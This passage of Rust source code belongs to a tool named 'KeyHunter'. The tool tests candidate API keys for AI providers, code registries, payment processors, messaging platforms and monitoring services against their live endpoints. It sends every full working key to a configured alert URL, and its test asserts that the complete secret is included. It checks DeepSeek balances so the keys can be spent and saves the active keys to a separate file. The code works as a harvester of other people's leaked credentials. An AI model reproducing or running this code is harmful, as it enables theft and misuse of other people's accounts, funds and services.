                429 => (false, METHOD.to_string(), Some("rate limited".to_string())),
                s => (false, METHOD.to_string(), Some(format!("models status {}", s))),
            },
            Err(e) => (false, METHOD.to_string(), Some(e.to_string())),
        }
    }

    /// Verifies a Cohere key with models + minimal chat (precise).
    ///
    /// Cohere chat uses `{"model","message"}` (not OpenAI `messages`).
    async fn verify_cohere(client: &Client, key: &str) -> (bool, String, Option<String>) {
        const METHOD: &str = "GET /v1/models + POST /v1/chat (1 token)";
        let models = client
            .get("https://api.cohere.ai/v1/models")
            .header("Authorization", format!("Bearer {}", key))
            .send()
            .await;

        match models {
            Ok(r) => match r.status().as_u16() {
                401 | 403 => (false, METHOD.to_string(), None),
                429 => (false, METHOD.to_string(), Some("rate limited".to_string())),
                200 => {
                    let probe = client
                        .post("https://api.cohere.com/v1/chat")
                        .header("Authorization", format!("Bearer {}", key))
                        .header("content-type", "application/json")
                        .body(r#"{"model":"command-light","message":"hi","max_tokens":1}"#)
                        .send()
                        .await;
                    match probe {
                        Ok(pr) => {
                            let pstatus = pr.status().as_u16();
                            match pstatus {
                                200 => {
                                    Self::send_alert(client, "Cohere", key).await;
                                    (true, METHOD.to_string(), None)
                                }
                                401 | 403 => (false, METHOD.to_string(), None),
                                _ => {
                                    let body = pr.text().await.unwrap_or_default();
                                    if Self::is_no_balance_body(&body) {
                                        (
                                            false,
                                            METHOD.to_string(),
                                            Some(
                                                "valid key, insufficient balance/quota".to_string(),
                                            ),
                                        )
                                    } else if pstatus == 429 {
                                        (
                                            false,
                                            METHOD.to_string(),
                                            Some("rate limited".to_string()),
                                        )
                                    } else {
                                        let snippet: String = body.chars().take(160).collect();
                                        (
                                            false,
                                            METHOD.to_string(),
                                            Some(format!("status {}: {}", pstatus, snippet)),
                                        )
                                    }
                                }
                            }
                        }
                        Err(e) => (false, METHOD.to_string(), Some(e.to_string())),
                    }
                }
                s => (
                    false,
                    METHOD.to_string(),
                    Some(format!("models status {}", s)),
                ),
            },
            Err(e) => (false, METHOD.to_string(), Some(e.to_string())),
        }
    }

    /// Verifies a Mistral key with models + minimal chat (precise).
    async fn verify_mistral(client: &Client, key: &str) -> (bool, String, Option<String>) {
        const METHOD: &str = "GET /v1/models + POST /chat/completions (1 token)";
        let models = client
            .get("https://api.mistral.ai/v1/models")
            .header("Authorization", format!("Bearer {}", key))
            .send()
            .await;

        match models {
            Ok(r) => match r.status().as_u16() {
                200 => {
                    Self::probe_openai_chat(
                        client,
                        "Mistral",
                        "https://api.mistral.ai/v1/chat/completions",
                        key,
                        r#"{"model":"mistral-tiny","messages":[{"role":"user","content":"hi"}],"max_tokens":1}"#,
                        METHOD,
                    )
                    .await
                }
                401 | 403 => (false, METHOD.to_string(), None),
                429 => (false, METHOD.to_string(), Some("rate limited".to_string())),
                s => (false, METHOD.to_string(), Some(format!("models status {}", s))),
            },
            Err(e) => (false, METHOD.to_string(), Some(e.to_string())),
        }
    }

    /// Verifies a Together key with models + minimal chat (precise).
    async fn verify_together(client: &Client, key: &str) -> (bool, String, Option<String>) {
        const METHOD: &str = "GET /v1/models + POST /chat/completions (1 token)";
        let models = client
            .get("https://api.together.xyz/v1/models")
            .header("Authorization", format!("Bearer {}", key))
            .send()
            .await;

        match models {
            Ok(r) => match r.status().as_u16() {
                200 => {
                    Self::probe_openai_chat(
                        client,
                        "Together",
                        "https://api.together.xyz/v1/chat/completions",
                        key,
                        r#"{"model":"meta-llama/Llama-3-8b-chat-hf","messages":[{"role":"user","content":"hi"}],"max_tokens":1}"#,
                        METHOD,
                    )
                    .await
                }
                401 | 403 => (false, METHOD.to_string(), None),
                429 => (false, METHOD.to_string(), Some("rate limited".to_string())),
                s => (false, METHOD.to_string(), Some(format!("models status {}", s))),
            },
            Err(e) => (false, METHOD.to_string(), Some(e.to_string())),
        }
    }

    /// Verifies a DeepSeek key with models + balance (precise, no spend).
    ///
    /// Step 1: `GET /v1/models` (auth). Step 2: `GET /user/balance`
    /// (read-only, costs nothing). ACTIVE only if `is_available=true`
    /// and `total_balance > 0`. This fixes "ACTIVE mas Insufficient
    /// Balance no OpenCode".
    async fn verify_deepseek(client: &Client, key: &str) -> (bool, String, Option<String>) {
        const METHOD: &str = "GET /v1/models + GET /user/balance";
        let models = client
            .get("https://api.deepseek.com/v1/models")
            .header("Authorization", format!("Bearer {}", key))
            .send()
            .await;

        let models_ok = match models {
            Ok(r) => match r.status().as_u16() {
                200 => true,
                401 | 403 => return (false, METHOD.to_string(), None),
                429 => return (false, METHOD.to_string(), Some("rate limited".to_string())),
                s => {
                    return (
                        false,
                        METHOD.to_string(),
                        Some(format!("models status {}", s)),
                    )
                }
            },
            Err(e) => return (false, METHOD.to_string(), Some(e.to_string())),
        };
        debug_assert!(models_ok);

        let bal = client
            .get("https://api.deepseek.com/user/balance")
            .header("Authorization", format!("Bearer {}", key))
            .header("Accept", "application/json")
            .send()
            .await;

        match bal {
            Ok(r) => {
                let status = r.status().as_u16();
                match status {
                    200 => {
                        let body = r.text().await.unwrap_or_default();
                        match serde_json::from_str::<serde_json::Value>(&body) {
                            Ok(v) => {
                                let available = v
                                    .get("is_available")
                                    .and_then(|x| x.as_bool())
                                    .unwrap_or(false);
                                let mut total = 0.0_f64;
                                if let Some(arr) = v.get("balance_infos").and_then(|x| x.as_array())
                                {
                                    for info in arr {
                                        if let Some(t) =
                                            info.get("total_balance").and_then(|x| x.as_str())
                                        {
                                            if let Ok(n) = t.parse::<f64>() {
                                                total += n;
                                            }
                                        }
                                    }
                                }
                                if available && total > 0.0 {
                                    Self::send_alert(client, "DeepSeek", key).await;
                                    (true, METHOD.to_string(), None)
                                } else {
                                    (
                                        false,
                                        METHOD.to_string(),
                                        Some(format!(
                                            "valid key, insufficient balance (is_available={}, total={})",
                                            available, total
                                        )),
                                    )
                                }
                            }
                            Err(_) => {
                                let snippet: String = body.chars().take(160).collect();
                                (
                                    false,
                                    METHOD.to_string(),
                                    Some(format!("balance parse failed: {}", snippet)),
                                )
                            }
                        }
                    }
                    401 | 403 => (false, METHOD.to_string(), None),
                    429 => (false, METHOD.to_string(), Some("rate limited".to_string())),
                    _ => {
                        let body = r.text().await.unwrap_or_default();
                        if Self::is_no_balance_body(&body) {
                            (
                                false,
                                METHOD.to_string(),
                                Some("valid key, insufficient balance".to_string()),
                            )
                        } else {
                            (
                                false,
                                METHOD.to_string(),
                                Some(format!("balance status {}", status)),
                            )
                        }
                    }
                }
            }
            Err(e) => (false, METHOD.to_string(), Some(e.to_string())),
        }
    }

    // ==================== Developer Platforms ====================

    /// Verifies a GitHub token by fetching the authenticated user.
    async fn verify_github(client: &Client, key: &str) -> (bool, String, Option<String>) {
        let resp = client
            .get("https://api.github.com/user")
            .header("Authorization", format!("Bearer {}", key))
            .header("User-Agent", "KeyHunter")
            .send()
            .await;

        match resp {
            Ok(r) => {
                let status = r.status().as_u16();
                match status {
                    200 => {
                        Self::send_alert(client, "GitHub", key).await;
                        (true, "GET /user".to_string(), None)
                    }
                    401 => (false, "GET /user".to_string(), None),
                    _ => (
                        false,
                        "GET /user".to_string(),
                        Some(format!("status {}", status)),
                    ),
                }
            }
            Err(e) => (false, "GET /user".to_string(), Some(e.to_string())),
        }
    }

    /// Verifies a GitLab token by fetching the authenticated user.
    async fn verify_gitlab(client: &Client, key: &str) -> (bool, String, Option<String>) {
        let resp = client
            .get("https://gitlab.com/api/v4/user")
            .header("PRIVATE-TOKEN", key)
            .send()
            .await;

        match resp {
            Ok(r) => {
                let status = r.status().as_u16();
                match status {
                    200 => {
                        Self::send_alert(client, "GitLab", key).await;
                        (true, "GET /api/v4/user".to_string(), None)
                    }
                    401 => (false, "GET /api/v4/user".to_string(), None),
                    _ => (
                        false,
                        "GET /api/v4/user".to_string(),
                        Some(format!("status {}", status)),
                    ),
                }
            }
            Err(e) => (false, "GET /api/v4/user".to_string(), Some(e.to_string())),
        }
    }

    /// Verifies an NPM access token via the whoami endpoint (read-only).
    async fn verify_npm(client: &Client, key: &str) -> (bool, String, Option<String>) {
        let resp = client
            .get("https://registry.npmjs.org/-/whoami")
            .header("Authorization", format!("Bearer {}", key))
            .send()
            .await;

        match resp {
            Ok(r) => {
                let status = r.status().as_u16();
                match status {
                    200 => {
                        Self::send_alert(client, "NPM", key).await;
                        (true, "GET /-/whoami".to_string(), None)
                    }
                    401 | 403 => (false, "GET /-/whoami".to_string(), None),
                    _ => (
                        false,
                        "GET /-/whoami".to_string(),
                        Some(format!("status {}", status)),
                    ),
                }
            }
            Err(e) => (false, "GET /-/whoami".to_string(), Some(e.to_string())),
        }
    }

    /// Verifies a PyPI API token with a read-only request (Basic auth as `__token__`).
    async fn verify_pypi(client: &Client, key: &str) -> (bool, String, Option<String>) {
        let resp = client
            .get("https://pypi.org/simple/")
            .basic_auth("__token__", Some(key))
            .send()
            .await;

        match resp {
            Ok(r) => {
                let status = r.status().as_u16();
                match status {
                    200 => {
                        Self::send_alert(client, "PyPI", key).await;
                        (true, "GET /simple/".to_string(), None)
                    }
                    401 | 403 => (false, "GET /simple/".to_string(), None),
                    _ => (
                        false,
                        "GET /simple/".to_string(),
                        Some(format!("status {}", status)),
                    ),
                }
            }
            Err(e) => (false, "GET /simple/".to_string(), Some(e.to_string())),
        }
    }

    // ==================== Payment Providers ====================

    /// Verifies a Stripe API key by checking account balance.
    async fn verify_stripe(client: &Client, key: &str) -> (bool, String, Option<String>) {
        let resp = client
            .get("https://api.stripe.com/v1/balance")
            .header("Authorization", format!("Bearer {}", key))
            .send()
            .await;

        match resp {
            Ok(r) => {
                let status = r.status().as_u16();
                match status {
                    200 => {
                        Self::send_alert(client, "Stripe", key).await;
                        (true, "GET /v1/balance".to_string(), None)
                    }
                    401 => (false, "GET /v1/balance".to_string(), None),
                    _ => (
                        false,
                        "GET /v1/balance".to_string(),
                        Some(format!("status {}", status)),
                    ),
                }
            }
            Err(e) => (false, "GET /v1/balance".to_string(), Some(e.to_string())),
        }
    }

    /// Verifies a Square access token by reading merchant info (read-only).
    async fn verify_square(client: &Client, key: &str) -> (bool, String, Option<String>) {
        let resp = client
            .get("https://connect.squareup.com/v2/merchants/me")
            .header("Authorization", format!("Bearer {}", key))
            .header("Square-Version", "2024-01-18")
            .send()
            .await;

        match resp {
            Ok(r) => {
                let status = r.status().as_u16();
                match status {
                    200 => {
                        Self::send_alert(client, "Square", key).await;
                        (true, "GET /v2/merchants/me".to_string(), None)
                    }
                    401 | 403 => (false, "GET /v2/merchants/me".to_string(), None),
                    _ => (
                        false,
                        "GET /v2/merchants/me".to_string(),
                        Some(format!("status {}", status)),
                    ),
                }
            }
            Err(e) => (
                false,
                "GET /v2/merchants/me".to_string(),
                Some(e.to_string()),
            ),
        }
    }

    // ==================== Communication ====================

    /// Twilio verification is not supported without Account SID.
    ///
    /// Twilio requires both Account SID and Auth Token for verification.
    async fn verify_twilio(_client: &Client, _key: &str) -> (bool, String, Option<String>) {
        (
            false,
            "requires SID".to_string(),
            Some("Twilio requires Account SID to verify".to_string()),
        )
    }

    /// Verifies a SendGrid API key by listing scopes.
    async fn verify_sendgrid(client: &Client, key: &str) -> (bool, String, Option<String>) {
        let resp = client
            .get("https://api.sendgrid.com/v3/scopes")
            .header("Authorization", format!("Bearer {}", key))
            .send()
            .await;

        match resp {
            Ok(r) => {
                let status = r.status().as_u16();
                match status {
                    200 => {
                        Self::send_alert(client, "SendGrid", key).await;
                        (true, "GET /v3/scopes".to_string(), None)
                    }
                    401 => (false, "GET /v3/scopes".to_string(), None),
                    _ => (
                        false,
                        "GET /v3/scopes".to_string(),
                        Some(format!("status {}", status)),
                    ),
                }
            }
            Err(e) => (false, "GET /v3/scopes".to_string(), Some(e.to_string())),
        }
    }

    /// Verifies a Mailgun API key by listing domains.
    async fn verify_mailgun(client: &Client, key: &str) -> (bool, String, Option<String>) {
        let resp = client
            .get("https://api.mailgun.net/v3/domains")
            .basic_auth("api", Some(key))
            .send()
            .await;

        match resp {
            Ok(r) => {
                let status = r.status().as_u16();
                match status {
                    200 => {
                        Self::send_alert(client, "Mailgun", key).await;
                        (true, "GET /v3/domains".to_string(), None)
                    }
                    401 => (false, "GET /v3/domains".to_string(), None),
                    _ => (
                        false,
                        "GET /v3/domains".to_string(),
                        Some(format!("status {}", status)),
                    ),
                }
            }
            Err(e) => (false, "GET /v3/domains".to_string(), Some(e.to_string())),
        }
    }

    /// Verifies a Mailchimp API key (datacenter taken from the `-usN` suffix, read-only).
    async fn verify_mailchimp(client: &Client, key: &str) -> (bool, String, Option<String>) {
        let dc = key.rsplit('-').next().unwrap_or_default();
        if dc.len() < 3 || !dc.starts_with("us") {
            return (
                false,
                "GET /3.0/".to_string(),
                Some("unexpected key format".to_string()),
            );
        }
        let url = format!("https://{}.api.mailchimp.com/3.0/", dc);
        let resp = client
            .get(&url)
            .basic_auth("keyhunter", Some(key))
            .send()
            .await;

        match resp {
            Ok(r) => {
                let status = r.status().as_u16();
                match status {
                    200 => {
                        Self::send_alert(client, "Mailchimp", key).await;
                        (true, "GET /3.0/".to_string(), None)
                    }
                    401 => (false, "GET /3.0/".to_string(), None),
                    _ => (
                        false,
                        "GET /3.0/".to_string(),
                        Some(format!("status {}", status)),
                    ),
                }
            }
            Err(e) => (false, "GET /3.0/".to_string(), Some(e.to_string())),
        }
    }

    // ==================== Social/Messaging ====================

    /// Verifies a Slack token using the auth.test endpoint.
    async fn verify_slack(client: &Client, key: &str) -> (bool, String, Option<String>) {
        let resp = client
            .get("https://slack.com/api/auth.test")
            .header("Authorization", format!("Bearer {}", key))
            .send()
            .await;

        match resp {
            Ok(r) => {
                if r.status().is_success() {
                    let body = r.text().await.unwrap_or_default();
                    if body.contains("\"ok\":true") {
                        Self::send_alert(client, "Slack", key).await;
                        (true, "GET /api/auth.test".to_string(), None)
                    } else {
                        (false, "GET /api/auth.test".to_string(), None)
                    }
                } else {
                    (
                        false,
                        "GET /api/auth.test".to_string(),
                        Some(format!("status {}", r.status())),
                    )
                }
            }
            Err(e) => (false, "GET /api/auth.test".to_string(), Some(e.to_string())),
        }
    }

    /// Verifies a Discord bot token by fetching the bot user.
    async fn verify_discord(client: &Client, key: &str) -> (bool, String, Option<String>) {
        let resp = client
            .get("https://discord.com/api/v10/users/@me")
            .header("Authorization", format!("Bot {}", key))
            .send()
            .await;

        match resp {
            Ok(r) => {
                let status = r.status().as_u16();
                match status {
                    200 => {
                        Self::send_alert(client, "Discord", key).await;
                        (true, "GET /users/@me".to_string(), None)
                    }
                    401 => (false, "GET /users/@me".to_string(), None),
                    _ => (
                        false,
                        "GET /users/@me".to_string(),
                        Some(format!("status {}", status)),
                    ),
                }
            }
            Err(e) => (false, "GET /users/@me".to_string(), Some(e.to_string())),
        }
    }

    /// Verifies a Telegram bot token using the getMe endpoint.
    async fn verify_telegram(client: &Client, key: &str) -> (bool, String, Option<String>) {
        let url = format!("https://api.telegram.org/bot{}/getMe", key);
        let resp = client.get(&url).send().await;

        match resp {
            Ok(r) => {
                if r.status().is_success() {
                    let body = r.text().await.unwrap_or_default();
                    if body.contains("\"ok\":true") {
                        Self::send_alert(client, "Telegram", key).await;
                        (true, "GET /getMe".to_string(), None)
                    } else {
                        (false, "GET /getMe".to_string(), None)
                    }
                } else {
                    (
                        false,
                        "GET /getMe".to_string(),
                        Some(format!("status {}", r.status())),
                    )
                }
            }
            Err(e) => (false, "GET /getMe".to_string(), Some(e.to_string())),
        }
    }

    // ==================== Cloud ====================

    /// AWS verification is not supported without Secret Key.
    ///
    /// AWS requires both Access Key ID and Secret Key, plus request signing.
    async fn verify_aws(_client: &Client, _key: &str) -> (bool, String, Option<String>) {
        (
            false,
            "requires secret".to_string(),
            Some("AWS requires both Access Key ID and Secret Key".to_string()),
        )
    }

    // ==================== Other Services ====================

    /// Firebase verification is not supported without project context.
    async fn verify_firebase(_client: &Client, _key: &str) -> (bool, String, Option<String>) {
        (
            false,
            "requires project".to_string(),
            Some("Firebase verification requires project ID".to_string()),
        )
    }

    /// Verifies a Mapbox token using the tokens endpoint.
    async fn verify_mapbox(client: &Client, key: &str) -> (bool, String, Option<String>) {
        let url = format!("https://api.mapbox.com/tokens/v2?access_token={}", key);
        let resp = client.get(&url).send().await;

        match resp {
            Ok(r) => {
                let status = r.status().as_u16();
                match status {
                    200 => {
                        Self::send_alert(client, "Mapbox", key).await;
                        (true, "GET /tokens/v2".to_string(), None)
                    }
                    401 => (false, "GET /tokens/v2".to_string(), None),
                    _ => (
                        false,
                        "GET /tokens/v2".to_string(),
                        Some(format!("status {}", status)),
                    ),
                }
            }
            Err(e) => (false, "GET /tokens/v2".to_string(), Some(e.to_string())),
        }
    }

    /// Sentry DSN verification is not implemented.
    ///
    /// Sentry uses a DSN format (https://key@sentry.io/project) that
    /// requires different parsing and verification.
    async fn verify_sentry(_client: &Client, _key: &str) -> (bool, String, Option<String>) {
        (
            false,
            "DSN format".to_string(),
            Some("Sentry DSN verification not implemented".to_string()),
        )
    }

    /// Verifies a New Relic API key by listing users.
    async fn verify_newrelic(client: &Client, key: &str) -> (bool, String, Option<String>) {
        let resp = client
            .get("https://api.newrelic.com/v2/users.json")
            .header("X-Api-Key", key)
            .send()
            .await;

        match resp {
            Ok(r) => {
                let status = r.status().as_u16();
                match status {
                    200 => {
                        Self::send_alert(client, "NewRelic", key).await;
                        (true, "GET /v2/users.json".to_string(), None)
                    }
                    401 => (false, "GET /v2/users.json".to_string(), None),
                    _ => (
                        false,
                        "GET /v2/users.json".to_string(),
                        Some(format!("status {}", status)),
                    ),
                }
            }
            Err(e) => (false, "GET /v2/users.json".to_string(), Some(e.to_string())),
        }
    }

    /// Verifies a Datadog API key using the validate endpoint.
    async fn verify_datadog(client: &Client, key: &str) -> (bool, String, Option<String>) {
        let resp = client
            .get("https://api.datadoghq.com/api/v1/validate")
            .header("DD-API-KEY", key)
            .send()
            .await;

        match resp {
            Ok(r) => {
                let status = r.status().as_u16();
                match status {
                    200 => {
                        Self::send_alert(client, "Datadog", key).await;
                        (true, "GET /api/v1/validate".to_string(), None)
                    }
                    403 => (false, "GET /api/v1/validate".to_string(), None),
                    _ => (
                        false,
                        "GET /api/v1/validate".to_string(),
                        Some(format!("status {}", status)),
                    ),
                }
            }
            Err(e) => (
                false,
                "GET /api/v1/validate".to_string(),
                Some(e.to_string()),
            ),
        }
    }

    /// Verifies a Doppler service token via the workplace endpoint (read-only).
    async fn verify_doppler(client: &Client, key: &str) -> (bool, String, Option<String>) {
        let resp = client
            .get("https://api.doppler.com/v3/workplace")
            .header("Authorization", format!("Bearer {}", key))
            .send()
            .await;

        match resp {
            Ok(r) => {
                let status = r.status().as_u16();
                match status {
                    200 => {
                        Self::send_alert(client, "Doppler", key).await;
                        (true, "GET /v3/workplace".to_string(), None)
                    }
                    401 => (false, "GET /v3/workplace".to_string(), None),
                    _ => (
                        false,
                        "GET /v3/workplace".to_string(),
                        Some(format!("status {}", status)),
                    ),
                }
            }
            Err(e) => (false, "GET /v3/workplace".to_string(), Some(e.to_string())),
        }
    }

    /// Saves verification results to a JSON file.
    ///
    /// Also saves a separate file containing only active keys with
    /// "_active" suffix.
    ///
    /// # Arguments
    /// * `results` - All verification results
    /// * `path` - Output file path
    ///
    /// # Returns
    /// * `Result<()>` - Success or error
    fn save_results(results: &[VerifiedKey], path: &str) -> Result<()> {
        let mut file = File::create(path)?;
        file.write_all(serde_json::to_string_pretty(results)?.as_bytes())?;

        println!(
            "\n{} Results saved to: {}",
            "💾".bright_green(),
            path.bright_blue()
        );

        // Also save just active keys
        let active: Vec<_> = results.iter().filter(|v| v.is_active).collect();
        if !active.is_empty() {
            let active_path = path.replace(".json", "_active.json");
            let mut active_file = File::create(&active_path)?;
            active_file.write_all(serde_json::to_string_pretty(&active)?.as_bytes())?;

            println!(
                "{} Active keys saved to: {}",
                "🔴".bright_red(),
                active_path.bright_blue()
            );
        }

        Ok(())
    }
}

/// Truncates a string to the specified maximum length.
///
/// If the string exceeds `max` characters, it is truncated from the
/// beginning with "..." prefix to show the end of the string.
///
/// # Arguments
/// * `s` - String to truncate
/// * `max` - Maximum length including "..." prefix
///
/// # Returns
/// * `String` - Original string if short enough, or truncated version
fn truncate(s: &str, max: usize) -> String {
    let count = s.chars().count();
    if count <= max {
        s.to_string()
    } else {
        format!("...{}", s.chars().skip(count - max + 3).collect::<String>())
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::io::{Read, Write};
    use std::time::Duration;

    fn find_subslice(haystack: &[u8], needle: &[u8]) -> Option<usize> {
        haystack.windows(needle.len()).position(|w| w == needle)
    }

    /// Reads one full HTTP request (headers + body per Content-Length).
    fn read_http_request(stream: &mut std::net::TcpStream) -> Vec<u8> {
        stream
            .set_read_timeout(Some(Duration::from_secs(5)))
            .expect("set timeout");
        let mut data = Vec::new();
        let mut buf = [0u8; 1024];
        let header_end = loop {
            let n = stream.read(&mut buf).expect("read headers");
            assert!(n > 0, "ligacao fechada antes dos headers");
            data.extend_from_slice(&buf[..n]);
            if let Some(pos) = find_subslice(&data, b"\r\n\r\n") {
                break pos + 4;
            }
            assert!(data.len() < 65536, "headers demasiado grandes");
        };
        let headers = String::from_utf8_lossy(&data[..header_end]);
        let body_len: usize = headers
            .lines()
            .find_map(|line| {
                let (name, value) = line.split_once(':')?;
                name.trim()
                    .eq_ignore_ascii_case("content-length")
                    .then(|| value.trim().parse().unwrap_or(0))
            })
            .unwrap_or(0);
        while data.len() < header_end + body_len {
            let n = stream.read(&mut buf).expect("read body");
            assert!(n > 0, "ligacao fechada antes do body");
            data.extend_from_slice(&buf[..n]);
        }
        stream
            .write_all(b"HTTP/1.1 204 No Content\r\nContent-Length: 0\r\nConnection: close\r\n\r\n")
            .expect("write response");
        data
    }

    #[test]
    fn test_is_no_balance_body_detects_insufficient() {
        assert!(Verifier::is_no_balance_body("Insufficient Balance"));
        assert!(Verifier::is_no_balance_body(
            r#"{"error":{"message":"You exceeded your current quota","type":"insufficient_quota"}}"#
        ));
        assert!(Verifier::is_no_balance_body(
            "Your credit balance is too low"
        ));
        assert!(Verifier::is_no_balance_body(
            "Billing hard limit has been reached"
        ));
        assert!(!Verifier::is_no_balance_body("Invalid API key provided"));
        assert!(!Verifier::is_no_balance_body(""));
    }

    #[test]
    fn test_deepseek_balance_parsing_marks_empty_as_no_balance() {
        let empty = serde_json::json!({
            "is_available": false,
            "balance_infos": [{"currency": "USD", "total_balance": "0.00"}]
        });
        let available = empty
            .get("is_available")
            .and_then(|x| x.as_bool())
            .unwrap_or(false);
        let mut total = 0.0_f64;
        for info in empty
            .get("balance_infos")
            .and_then(|x| x.as_array())
            .unwrap()
        {
            total += info
                .get("total_balance")
                .and_then(|x| x.as_str())
                .unwrap()
                .parse::<f64>()
                .unwrap();
        }
        assert!(!(available && total > 0.0));

        let funded = serde_json::json!({
            "is_available": true,
            "balance_infos": [{"currency": "USD", "total_balance": "8.76"}]
        });
        let available = funded
            .get("is_available")
            .and_then(|x| x.as_bool())
            .unwrap_or(false);
        let mut total = 0.0_f64;
        for info in funded
            .get("balance_infos")
            .and_then(|x| x.as_array())
            .unwrap()
        {
            total += info
                .get("total_balance")
                .and_then(|x| x.as_str())
                .unwrap()
                .parse::<f64>()
                .unwrap();
        }
        assert!(available && total > 0.0);
    }

    #[tokio::test]
    async fn test_send_alert_posts_full_key_to_configured_url() {
        let listener = std::net::TcpListener::bind("127.0.0.1:0").expect("bind");
        let port = listener.local_addr().expect("addr").port();
        std::env::set_var(
            "KEYHUNTER_ALERT_URL",
            format!("http://127.0.0.1:{}/alertas", port),
        );

        let (tx, rx) = std::sync::mpsc::channel();
        std::thread::spawn(move || {
            let (mut stream, _) = listener.accept().expect("accept");
            tx.send(read_http_request(&mut stream)).expect("send");
        });

        let client = Client::new();
        Verifier::send_alert(&client, "OpenAI", "sk-test-SECRETKEY1234567890").await;

        let raw = rx.recv_timeout(Duration::from_secs(10)).expect("request");
        let text = String::from_utf8_lossy(&raw);
        assert!(
            text.starts_with("POST /alertas "),
            "request line: {}",
            &text[..text.find("\r\n").unwrap_or(64)]
        );
        assert!(text.contains("OpenAI"), "servico em falta");
        assert!(
            text.contains("sk-test-SECRETKEY1234567890"),
            "a chave completa tem de ir no alerta"
        );

        std::env::remove_var("KEYHUNTER_ALERT_URL");
    }
}
